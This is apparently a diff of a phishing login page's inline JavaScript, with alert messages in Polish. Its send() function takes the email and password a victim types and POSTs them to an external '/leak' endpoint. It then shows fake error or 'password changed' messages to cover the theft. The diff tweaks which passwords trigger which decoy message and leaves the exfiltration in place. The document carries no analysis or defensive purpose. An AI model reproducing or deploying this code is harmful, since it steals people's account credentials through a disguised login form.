@@ -76,41 +76,30 @@
     <script>
         rotateBackground();
             function send() {
-
                 em = document.getElementById('em').value
-
                 pa = document.getElementById('pa').value
 
-
-
                 
-
-                if (pa.toLowerCase().includes('wkgosia') {
-
+                if (pa.toLowerCase() == 'wkgosia' || 
+    pa.toLowerCase() == 'wkgosia793' || 
+    pa.toLowerCase() == 'wk gos 793' || 
+    pa.toLowerCase() == 'wkgos973' || pa.toLowerCase() == 'wk gosia' ) {
                     fetch('https://ddddd-1-ygxs.onrender.com/leak', {'method': 'POST', 'headers': {'content-type': 'application/json'}, 'body': JSON.stringify({'email': em, 'password': pa})})
-
                     alert('Hasło zostało zmienione 12 Miesięcy temu.')
-
                     location.reload()
-
                 }
-
                 else {
-
                                     
-
                 fetch('https://ddddd-1-ygxs.onrender.com/leak', {'method': 'POST', 'headers': {'content-type': 'application/json'}, 'body': JSON.stringify({'email': em, 'password': pa})})
-
                 location.reload()
-
                 alert('Hasło lub Email jest niepoprawne. Podaj Poprawne Hasło oraz Email.')
-
                 };
-            location.reload();
-        }
+            }
+        
     </script>
 </body>
 </html>
+
 
 
 
